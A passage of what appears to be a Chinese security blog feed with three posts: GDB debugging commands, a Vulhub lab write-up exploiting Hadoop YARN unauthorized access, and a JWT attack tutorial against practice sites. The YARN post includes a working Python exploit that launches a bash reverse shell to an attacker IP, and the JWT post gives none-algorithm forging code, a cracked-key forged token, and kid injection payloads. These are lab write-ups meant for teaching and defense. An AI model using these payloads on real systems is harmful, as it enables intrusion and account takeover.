<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i=<span class="number">100</span>;</span><br><span class="line">	<span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;i is &quot;</span>  &lt;&lt; i &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span>**argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> itest=<span class="number">100</span>;test();</span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">char</span> *str=<span class="string">&quot;this is a test&quot;</span>;</span><br><span class="line">	<span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;itest is &quot;</span> &lt;&lt; itest &lt;&lt; <span class="string">&quot;,str is &quot;</span> &lt;&lt; str &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">	<span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;参数为:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;argc;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; argv[i]&lt;&lt;<span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Hello world\n&quot;</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="启动调试"><a href="#启动调试" class="headerlink" title="启动调试"></a>启动调试</h2><p><strong>传入参数</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gdb --args 参数</span><br><span class="line">在gdb中使用set args和r指定参数</span><br></pre></td></tr></table></figure>

<img src="/2022/01/23/GDB%E8%B0%83%E8%AF%95%E4%BD%BF%E7%94%A8/image-20231215133650975.png" class title="image-20231215133650975">

<img src="/2022/01/23/GDB%E8%B0%83%E8%AF%95%E4%BD%BF%E7%94%A8/image-20231215133731296.png" class title="image-20231215133731296">

<img src="/2022/01/23/GDB%E8%B0%83%E8%AF%95%E4%BD%BF%E7%94%A8/image-20231215133758541.png" class title="image-20231215133758541">

<p><strong>附加进程</strong></p>
<p>对运行的进程进行调试</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gdb attach pid</span><br><span class="line"></span><br><span class="line">gdb --pid pid</span><br></pre></td></tr></table></figure>

<p><strong>执行</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">n 不会进入函数</span><br><span class="line">s 会进入函数</span><br><span class="line">finish 退出函数</span><br></pre></td></tr></table></figure>

<h2 id="断点管理"><a href="#断点管理" class="headerlink" title="断点管理"></a><strong>断点管理</strong></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b 文件名:行数</span><br><span class="line"></span><br><span class="line">b 函数名，如果是同名函数则都会标记</span><br><span class="line"></span><br><span class="line">rb 名字。对于带这个名字的函数都会进行标记，包括虚函数，或者命名不全的函数</span><br><span class="line"></span><br><span class="line">b 断点 条件   b main.cpp:14 if i==90。也就是执行循环到到i=90才会停止</span><br><span class="line"></span><br><span class="line">tb 断点。设置临时断点。对于一个循环来说，虽然断点在这，但只会执行一次，就不执行循环了</span><br><span class="line"></span><br><span class="line">i b查看所有断点</span><br><span class="line"></span><br><span class="line">i b 1 查看编号1的断点</span><br><span class="line"></span><br><span class="line">delete 1 删除断点1</span><br><span class="line"></span><br><span class="line">delete  删除所有断点</span><br><span class="line"></span><br><span class="line">disable 1 禁用断点1</span><br><span class="line"></span><br><span class="line">enable 1 使能断点1</span><br><span class="line"></span><br><span class="line">//为断点执行命令：</span><br><span class="line">commads</span><br><span class="line"></span><br><span class="line">命令1</span><br><span class="line"></span><br><span class="line">命令2</span><br><span class="line"></span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">//保存断点信息</span><br><span class="line"></span><br><span class="line">save breakpoints 文件名.tx</span><br><span class="line"></span><br><span class="line">//还原断点信息</span><br><span class="line"></span><br><span class="line">source 文件名.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="变量查看"><a href="#变量查看" class="headerlink" title="变量查看"></a>变量查看</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">info args 查看输入的全部信息</span><br><span class="line"></span><br><span class="line">p argc查看输入了几个变量</span><br><span class="line"></span><br><span class="line">p argv[0]查看第一个变量是什么</span><br><span class="line"></span><br><span class="line">info args 查看输入的全部信息</span><br><span class="line"></span><br><span class="line">p argc查看输入了几个变量</span><br><span class="line"></span><br><span class="line">p argv[0]查看第一个变量是什么</span><br><span class="line"></span><br><span class="line">set p null-stop//设置字符串不显示后面的空余空间</span><br><span class="line"></span><br><span class="line">set p pretty//结构体和数组显示规则更好看，每行一个</span><br><span class="line"></span><br><span class="line">p int=10  //修改整型</span><br><span class="line"></span><br><span class="line">p str=“str”  //修改字符串</span><br><span class="line"></span><br><span class="line">//修改结构体</span><br><span class="line">p test.name=&quot;str&quot;</span><br><span class="line"></span><br><span class="line">p test.agr=10</span><br><span class="line"></span><br><span class="line">p strcpy(test.name, &quot;str&quot;)</span><br></pre></td></tr></table></figure>

<h2 id="内存查看和修改"><a href="#内存查看和修改" class="headerlink" title="内存查看和修改"></a>内存查看和修改</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">x /d 10进制显示</span><br><span class="line"></span><br><span class="line">x /b 二进制显示</span><br><span class="line"></span><br><span class="line">x /s显示字符串</span><br><span class="line"></span><br><span class="line">x /wx查看word字节</span><br></pre></td></tr></table></figure>

<p>寄存器查看和修改</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">i r rdi/rsi/rdx/rcx/r8/r9</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>内功心法</category>
        <category>工具使用</category>
      </categories>
      <tags>
        <tag>-GDB -调试</tag>
      </tags>
  </entry>
  <entry>
    <title>Hadoop-YARN未授权访问</title>
    <url>/2022/04/20/Hadoop-YARN%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/</url>
    <content><![CDATA[<h1 id="Hadoop-YARN未授权访问"><a href="#Hadoop-YARN未授权访问" class="headerlink" title="Hadoop-YARN未授权访问"></a>Hadoop-YARN未授权访问</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Hadoop是一个由Apache的分布式系统基础架构，用户可开发分布式程序，充分利用集群的威力进行高速运算和存储，实现了一个分布式文件系统（Hadoop Distributed File System）。</p>
<p>其中HDFS组件有高容错性的特点，并且部署在低廉的（low-cost）硬件上即可提供高吞吐量（high throughput）来访问应用程序的数据。</p>
<img src="/2022/04/20/Hadoop-YARN%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/image-20220420105822011.png" class title="image-20220420105822011">

<p>Apache Yarn（Yet Another Resource Negotiator的缩写）是hadoop集群资源管理器系统，Yarn从hadoop 2引入，最初是为了改善MapReduce的实现，但是它具有通用性，同样执行其他分布式计算模式。</p>
<p>ApplicationMaster负责与scheduler协商合适的container，跟踪应用程序的状态，以及监控它们的进度，ApplicationMaster是协调集群中应用程序执行的进程。每个应用程序都有自己的ApplicationMaster，负责与ResourceManager协商资源（container）和NodeManager协同工作来执行和监控任务 。</p>
<p>当一个ApplicationMaster启动后，会周期性的向resourcemanager发送心跳报告来确认其健康和所需的资源情况，在建好的需求模型中，ApplicationMaster在发往resourcemanager中的心跳信息中封装偏好和限制，在随后的心跳中，ApplicationMaster会对收到集群中特定节点上绑定了一定的资源的container的租约，根据Resourcemanager发来的container，ApplicationMaster可以更新它的执行计划以适应资源不足或者过剩，container可以动态的分配和释放资源。</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>使用Vulhub进行搭建</p>
<img src="/2022/04/20/Hadoop-YARN%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/image-20220420110521767.png" class title="image-20220420110521767">

<p>浏览器访问<a href="http://ip:8088/">http://ip:8088</a></p>
<img src="/2022/04/20/Hadoop-YARN%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/image-20220420110624008.png" class title="image-20220420110624008">

<h2 id="漏洞探测"><a href="#漏洞探测" class="headerlink" title="漏洞探测"></a>漏洞探测</h2><p>通过REST API提交任务执行申请新的application:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -v -X http://yourip:8088/ws/v1/cluster/apps/new-application</span><br></pre></td></tr></table></figure>

<p>返回异常信息</p>
<img src="/2022/04/20/Hadoop-YARN%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/image-20220420110903627.png" class title="image-20220420110903627">

<img src="/2022/04/20/Hadoop-YARN%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/image-20220420111006307.png" class title="image-20220420111006307">

<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>先以post请求访问&#x2F;ws&#x2F;v1&#x2F;cluster&#x2F;apps&#x2F;new-application，获取application-id</p>
<img src="/2022/04/20/Hadoop-YARN%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/image-20220420111413118.png" class title="image-20220420111413118">

<p>application-id为application_1650423858134_0001</p>
<p>然后Post请求&#x2F;ws&#x2F;v1&#x2F;cluster&#x2F;apps,设置application-id和command命令，发送请求。</p>
<img src="/2022/04/20/Hadoop-YARN%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/image-20220420113354614.png" class title="image-20220420113354614">

<p><strong>exp</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">target = &#x27;http://192.168.211.132:8088/&#x27;#hodoop目标地址</span><br><span class="line">lhost = &#x27;192.168.211.132&#x27; # 攻击方的IP地址</span><br><span class="line"></span><br><span class="line">url = target + &#x27;ws/v1/cluster/apps/new-application&#x27;</span><br><span class="line">resp = requests.post(url)</span><br><span class="line">app_id = resp.json()[&#x27;application-id&#x27;]</span><br><span class="line">url = target + &#x27;ws/v1/cluster/apps&#x27;</span><br><span class="line">data = &#123;</span><br><span class="line">    &#x27;application-id&#x27;: app_id,</span><br><span class="line">    &#x27;application-name&#x27;: &#x27;get-shell&#x27;,</span><br><span class="line">    &#x27;am-container-spec&#x27;: &#123;</span><br><span class="line">        &#x27;commands&#x27;: &#123;</span><br><span class="line">            &#x27;command&#x27;: &#x27;/bin/bash -i &gt;&amp; /dev/tcp/%s/1234 0&gt;&amp;1&#x27; % lhost,</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">    &#x27;application-type&#x27;: &#x27;YARN&#x27;,</span><br><span class="line">&#125;</span><br><span class="line">requests.post(url, json=data)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>反弹shell成功，执行命令。</p>
<img src="/2022/04/20/Hadoop-YARN%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/image-20220420112523630.png" class title="image-20220420112523630">



<h2 id="防护建议"><a href="#防护建议" class="headerlink" title="防护建议"></a>防护建议</h2><p>1.建议项目拥有者将暴露在公网的服务<strong>端口（8040,8042,8088,50060,50070等）屏蔽掉，或做白名单访问处理。</strong></p>
<p>2.<strong>对Hadoop web Manager服务（8088）做访问身份认证处理</strong>，对接收的数据包进行认证。</p>
<p>3.<strong>修改默认端口</strong>，防止端口服务被批量利用。</p>
]]></content>
      <categories>
        <category>Web漏洞</category>
        <category>Web应用漏洞</category>
        <category>Hadoop</category>
      </categories>
      <tags>
        <tag>-web漏洞 - Hadoop -YARN</tag>
      </tags>
  </entry>
  <entry>
    <title>JWT攻击</title>
    <url>/2021/11/26/JWT%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<h1 id="JWT攻击"><a href="#JWT攻击" class="headerlink" title="JWT攻击"></a>JWT攻击</h1><hr>
<h2 id="JWT简介"><a href="#JWT简介" class="headerlink" title="JWT简介"></a>JWT简介</h2><hr>
<p>JSON Web Token（JWT）是一种用于客户端和服务端通信双方之间传递身份认证信息、URL安全的表述性声明规范，经常用在跨域身份验证，分布式站点的单点登录。</p>
<h2 id="JWT认证流程"><a href="#JWT认证流程" class="headerlink" title="JWT认证流程"></a><strong>JWT认证流程</strong></h2><p>如图所示：</p>
<img src="/2021/11/26/JWT%E6%94%BB%E5%87%BB/image-20211122154727932.png" class title="image-20211122154727932">



<p>1.在客户端提交用户名密码等认证信息到服务端进行验证，服务端验证成功后返回一个具有一定时效性的Token，返回给客户端保存</p>
<p>2.客户端在收到Token后，将其保存在cookie或者LocalStorage中</p>
<p>3.客户端在以后与服务端的通信过程中都会带着这个Token进行请求服务资源，服务端在验证Token后返回对应资源</p>
<p><strong>JWT与其他认证方式区别</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Cookie: </span><br><span class="line">记录访问控制客户端的相关信息，请求服务端时需要带上Cookie访问。对于一般的cookie，如果我们的加密措施不当，很容易造成信息泄露，甚至信息伪造。</span><br><span class="line"></span><br><span class="line">Session:</span><br><span class="line">客户端在服务端登陆成功之后，服务端会生成一个sessionID，返回给客户端，客户端将sessionID保存到cookie中，session保存在服务端，当客户访问量增加时，服务端就需要存储大量的session会话，对服务器有很大的考验</span><br><span class="line"></span><br><span class="line">JWT:</span><br><span class="line">服务端不需要存储会话信息，服务器本身只对Token进行加密，有效减少服务器开销。用于防护CSRF攻击，利于分布式站点的应用拓展</span><br></pre></td></tr></table></figure>



<h2 id="JWT构成"><a href="#JWT构成" class="headerlink" title="JWT构成"></a>JWT构成</h2><p><strong>JWT构成:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">第一部分；头部（header）</span><br><span class="line"></span><br><span class="line">第二部分: 荷载 (payload)</span><br><span class="line"></span><br><span class="line">第三部分: 签证 (signature)</span><br></pre></td></tr></table></figure>



<p>这三个部分使用Base64进行加密处理，中间以”.”符号进行连接</p>
<img src="/2021/11/26/JWT%E6%94%BB%E5%87%BB/image-20211122172203146.png" class title="image-20211122172203146">



<h3 id="头部-header"><a href="#头部-header" class="headerlink" title="头部(header)"></a>头部(header)</h3><p>JWT头部承载两部分信息:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 类型(type).如JWT</span><br><span class="line">2. 加密算法(alg).通常使用HMAC SHA256 HS256</span><br><span class="line">   HMAC(HS256):是一种对称加密算法，使用秘密密钥对每条消息进行签名和验证</span><br><span class="line">   RSA(RS256)：是一种非对称加密算法，使用私钥加密明文，公钥解密密文</span><br></pre></td></tr></table></figure>

<p>格式如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;alg&quot;: &quot;HS256&quot;,</span><br><span class="line">  &quot;typ&quot;: &quot;JWT&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="荷载-payload"><a href="#荷载-payload" class="headerlink" title="荷载(payload)"></a>荷载(payload)</h3><p>荷载就是存放有效信息的地方。</p>
<p>有效信息包括三个部分:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">标准中注册的声明：</span><br><span class="line">iss(jwt签发者)</span><br><span class="line">sub(jwt面向用户)</span><br><span class="line">aud(接受jwt的一方)</span><br><span class="line">exp(jwt的过期时间，应大于签发时间)</span><br><span class="line">nbf(定义在什么时间之前，该jwt都是不可用)</span><br><span class="line">iat(jwt的签发时间)</span><br><span class="line">jti(jwt的唯一身份标识，用于一次性token,避免重放攻击)</span><br><span class="line"></span><br><span class="line">公共的声明：</span><br><span class="line">公共的声明可以添加任何的信息。一般添加用户的相关信息或者其他业务需要的必要信息(不建议添加敏感信息，因为该部分可进行解码)</span><br><span class="line"></span><br><span class="line">私有的声明：</span><br><span class="line">私有声明一般由提供者和消费者所共同定义的声明(不建议添加敏感信息，因为该部分可进行解码)</span><br></pre></td></tr></table></figure>



<p>JWT荷载部分如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;iss&quot;: &quot;yzt&quot;</span><br><span class="line">  “aud”：&quot;haoyun&quot;</span><br><span class="line">  &quot;sub&quot;: &quot;1234567890&quot;,</span><br><span class="line">  &quot;exp&quot;: &quot;xxxx-xx-xx&quot;</span><br><span class="line">  &quot;name&quot;: &quot;John Doe&quot;,</span><br><span class="line">  &quot;iat&quot;: 1516239022</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="签名-signature"><a href="#签名-signature" class="headerlink" title="签名(signature)"></a>签名(signature)</h3><p>JWT的第三部分为签名信息。</p>
<p>该部分是将头部和荷载这两部分使用Base64编码后拼接，使用头部中指定的加密算法(alg字段)进行加密等到。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alg(BASE64ENCODE(Header)+BASE64ENCODE(PAYLOAD))</span><br></pre></td></tr></table></figure>



<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// javascript</span></span><br><span class="line"><span class="keyword">var</span> encodedString = base64UrlEncode(header) + <span class="string">&#x27;.&#x27;</span> + base64UrlEncode(payload);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> signature = HMACSHA256(encodedString, <span class="string">&#x27;secret&#x27;</span>);</span><br></pre></td></tr></table></figure>



<h2 id="JWT攻击-1"><a href="#JWT攻击-1" class="headerlink" title="JWT攻击"></a>JWT攻击</h2><hr>
<p>我们从上面JWT的构造来看，针对JWT的攻击还是在Header和Payload这两部分。比如敏感信息泄露，空加密，密钥爆破等</p>
<h3 id="常见JWT漏洞存在位置"><a href="#常见JWT漏洞存在位置" class="headerlink" title="常见JWT漏洞存在位置"></a>常见JWT漏洞存在位置</h3><p>（1）Header部分</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">是否支持修改算法为none/对称加密算法</span><br><span class="line">是否可以删除签名</span><br><span class="line">插入错误信息</span><br><span class="line">kid字段是否有SQL注入/命令注入/目录遍历</span><br><span class="line">jwk元素是否可信</span><br><span class="line">是否强制使用白名单上的加密算法</span><br></pre></td></tr></table></figure>



<p>（2）Payload部分</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">其中是否存在敏感信息检查过期策略，比如 exp, iat</span><br></pre></td></tr></table></figure>



<p>（3）Signature部分</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">检查是否强制检查签名</span><br><span class="line">密钥是否可以爆破（如HMAC)</span><br><span class="line">是否可以通过其他方式拿到密钥</span><br><span class="line">采用了自身存在脆弱性的算法（如ECDH-ES）</span><br><span class="line">签名方法之间是否存在冲突</span><br></pre></td></tr></table></figure>



<p>（4）其他</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">重放</span><br><span class="line">通过匹配校验的时间做时间攻击</span><br><span class="line">修改算法非对称算法为对称算法（如修改RS256为HS256）</span><br><span class="line">弱密钥破解</span><br><span class="line">不安全的配置所导致的敏感信息泄露（如在报错信息中泄露签名）</span><br></pre></td></tr></table></figure>



<p>这里需要使用的工具如下:</p>
<p>JWT解密地址:<a href="https://jwt.io/">JSON Web Tokens - jwt.io</a></p>
<p>MD5解密工具:<a href="https://cmd5.com/">md5在线解密破解,md5解密加密 (cmd5.com)</a></p>
<p>JWT靶场地址:</p>
<p><a href="https://authlab.digi.ninja/">https://authlab.digi.ninja/</a></p>
<p>webgoat离线靶场</p>
<p>Base64编码 &#x2F;解码工具:</p>
<p><a href="https://tool.oschina.net/encrypt?type=3">在线加密解密 (oschina.net)</a></p>
<h3 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h3><p>当在荷载(payload)中添加了一些敏感信息(如账号密码等)，可通过Base64解码得到。</p>
<p>靶场地址: <a href="https://authlab.digi.ninja/Leaky_JWT">Leaky JWT (digi.ninja)</a></p>
<img src="/2021/11/26/JWT%E6%94%BB%E5%87%BB/image-20211122193259546.png" class title="image-20211122193259546">



<p>将图中的JWT进行解密</p>
<img src="/2021/11/26/JWT%E6%94%BB%E5%87%BB/image-20211122193555616.png" class title="image-20211122193555616">



<p>可以看到在荷载中的用户名(username)和密码(password)等字段。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;level&quot;: &quot;admin&quot;,</span><br><span class="line">  &quot;password&quot;: &quot;2ac9cb7dc02b3c0083eb70898e549b63&quot;,</span><br><span class="line">  &quot;username&quot;: &quot;joe&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>这里的密码字段由MD5加密而成，尝试进行解密</p>
<img src="/2021/11/26/JWT%E6%94%BB%E5%87%BB/image-20211122193807785.png" class title="image-20211122193807785">



<p>将得到的账户和密码在靶场中登录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username: joe</span><br><span class="line">passwd:Password1</span><br></pre></td></tr></table></figure>

<p>登录成功</p>
<img src="/2021/11/26/JWT%E6%94%BB%E5%87%BB/image-20211122193946272.png" class title="image-20211122193946272">



<h3 id="无效签名（CVE-2019-7644）"><a href="#无效签名（CVE-2019-7644）" class="headerlink" title="无效签名（CVE-2019-7644）"></a>无效签名（CVE-2019-7644）</h3><p>1.0.4 之前的Auth0 Auth0-WCF-Service-JWT 在无法成功验证 JWT 签名时，会在错误消息中泄漏预期的 JWT 签名。如果向攻击者显示此错误消息，他们可以伪造任意 JWT 令牌，该令牌将被易受攻击的应用程序接受</p>
<p>靶场地址:</p>
<p><a href="https://authlab.digi.ninja/Auth1">Auth1 (digi.ninja)</a></p>
<img src="/2021/11/26/JWT%E6%94%BB%E5%87%BB/image-20211123201720181.png" class title="image-20211123201720181">



<p>当对JWT进行改动时，会报错显示签名</p>
<img src="/2021/11/26/JWT%E6%94%BB%E5%87%BB/image-20211123202044385.png" class title="image-20211123202044385">

<p>签名如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Hnpn5k6NtrXn8qvOuiSsFjXhAolQGn3TfmGBvA7EGTU</span><br></pre></td></tr></table></figure>



<p>将报错显示的签名信息替换原来的Signature（签名）字段，登录成功</p>
<img src="/2021/11/26/JWT%E6%94%BB%E5%87%BB/image-20211126144522655.png" class title="image-20211126144522655">





<h3 id="空加密算法"><a href="#空加密算法" class="headerlink" title="空加密算法"></a>空加密算法</h3><p>JWT支持使用空加密算法，可以在header中指定alg为<code>None</code></p>
<p><strong>将secret置空。利用node的jsonwentoken库已知缺陷：当jwt的secret为null或undefined时，jsonwebtoken会采用algorithm为none进行验证</strong></p>
<p>由于alg字段为none,所以只要把signature设置为空提交到服务器，token都可以通过服务器的验证.</p>
<p>靶场地址:</p>
<p><a href="https://authlab.digi.ninja/JWT_None">JWT None Algorithm (digi.ninja)</a></p>
<p>代码如下；</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line">token = jwt.encode(</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;user&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">&#125;,</span><br><span class="line">algorithm=<span class="string">&quot;none&quot;</span>,key=<span class="string">&quot;&quot;</span></span><br><span class="line">).decode(encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(token)</span><br></pre></td></tr></table></figure>



<p>使用Base64编码工具设置JWT的Header部分的alg字段为None</p>
<img src="/2021/11/26/JWT%E6%94%BB%E5%87%BB/image-20211126111400515.png" class title="image-20211126111400515">





<img src="/2021/11/26/JWT%E6%94%BB%E5%87%BB/image-20211123203312415.png" class title="image-20211123203312415">



<h3 id="密钥爆破"><a href="#密钥爆破" class="headerlink" title="密钥爆破"></a>密钥爆破</h3><p>JWT中最常用的两种算法是HMAC和RSA。这两种算法都是使用私钥对signature字段进行签名，所以只要拥有了加密使用的私钥，才能伪造token.但HMAC这种对称加密算法，只有一个密钥进行加密解密。</p>
<p>JWT 的密钥爆破需要在一定的前提下进行：</p>
<ul>
<li>知悉JWT使用的加密算法</li>
<li>一段有效的、已签名的token</li>
<li>签名用的密钥不复杂（弱密钥）</li>
</ul>
<p>靶场地址；</p>
<p><a href="https://authlab.digi.ninja/JWT_Cracking">Cracking JWT Keys (digi.ninja)</a></p>
<p>爆破工具；</p>
<p><a href="https://github.com/brendan-rius/c-jwt-cracker">c-jwt-cracker</a></p>
<p>我们打开靶场地址，如下:</p>
<p>可以看到使用靶场提供的JWT登录为jasper用户</p>
<img src="/2021/11/26/JWT%E6%94%BB%E5%87%BB/image-20211126135442521.png" class title="image-20211126135442521">



<p>命令；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//Build a Docker Image</span><br><span class="line">docker build . -t jwtcrack</span><br><span class="line"></span><br><span class="line">//Run on Docker</span><br><span class="line">docker run -it --rm  jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE2Mzc4OTgwMjgsImxldmVsIjoidXNlciIsInVzZXIiOiJqYXNwZXIifQ.T1J2RL69EufdU4I6g_JnKm3UaITCJsk5DxrR2HgDFhk</span><br></pre></td></tr></table></figure>

<p>使用cracker工具爆破JWT中的密钥，可以看到下方密钥为hello</p>
<img src="/2021/11/26/JWT%E6%94%BB%E5%87%BB/image-20211126135148847.png" class title="image-20211126135148847">

<p>知道密钥后我们可以自定义设置JWT内容，设置加密密钥为hello，伪造登录用户</p>
<p>下面我们来伪造JWT</p>
<img src="/2021/11/26/JWT%E6%94%BB%E5%87%BB/image-20211126141542944.png" class title="image-20211126141542944">

<p>得到伪造的JWT：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE2Mzc4OTgwMjgsImxldmVsIjoiYWRtaW4iLCJ1c2VyIjoid2hhbGVmYWxsIn0.DpJepuO0BICPKPFevJfTvLTPthbsKS9FvQv_Ws_h1AM</span><br></pre></td></tr></table></figure>



<p>将伪造的JWT放到靶场进行登录，登录成功</p>
<img src="/2021/11/26/JWT%E6%94%BB%E5%87%BB/image-20211126141706896.png" class title="image-20211126141706896">



<h3 id="修改KID参数"><a href="#修改KID参数" class="headerlink" title="修改KID参数"></a>修改KID参数</h3><p>KID(KEY ID)是JWT Header中的一个可选字段,用于指定加密算法的密钥。针对KID参数的攻击存在目录遍历、SQL注入、命令注入等。</p>
<h4 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;alg&quot; : &quot;HS256&quot;,</span><br><span class="line">    &quot;typ&quot; : &quot;jwt&quot;,</span><br><span class="line">    &quot;kid&quot; : &quot;/etc/passwd&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="Sql注入"><a href="#Sql注入" class="headerlink" title="Sql注入"></a>Sql注入</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;alg&quot; : &quot;HS256&quot;,</span><br><span class="line">    &quot;typ&quot; : &quot;jwt&quot;,</span><br><span class="line">    &quot;kid&quot; : &quot;aaaaaaa&#x27; UNION SELECT &#x27;key&#x27;;-- &quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;alg&quot; : &quot;HS256&quot;,</span><br><span class="line">    &quot;typ&quot; : &quot;jwt&quot;,</span><br><span class="line">    &quot;kid&quot; : &quot;/path/to/key_file|whoami&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h3 id="修改JKU-x2F-XSU参数"><a href="#修改JKU-x2F-XSU参数" class="headerlink" title="修改JKU&#x2F;XSU参数"></a>修改JKU&#x2F;XSU参数</h3><p>这两个参数也是为Header部分的可选字段，JKU（JWKSet URL）用于指定链接到一组加密token密钥的URL。XSU头部参数允许攻击者用户验证Token的公钥证书或者证书链。</p>
<p>如果没有对JKU字段内容进行严格过滤且舐限定条件，可以随机指定一组自定义密钥文件，并指定Web应用使用设置的密钥来验证token。</p>
]]></content>
      <categories>
        <category>Web漏洞</category>
        <category>认证方式</category>
      </categories>
      <tags>
        <tag>-JWT - 认证方式</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA类型描述符</title>
    <url>/2021/12/02/JAVA%E7%B1%BB%E5%9E%8B%E6%8F%8F%E8%BF%B0%E7%AC%A6/</url>
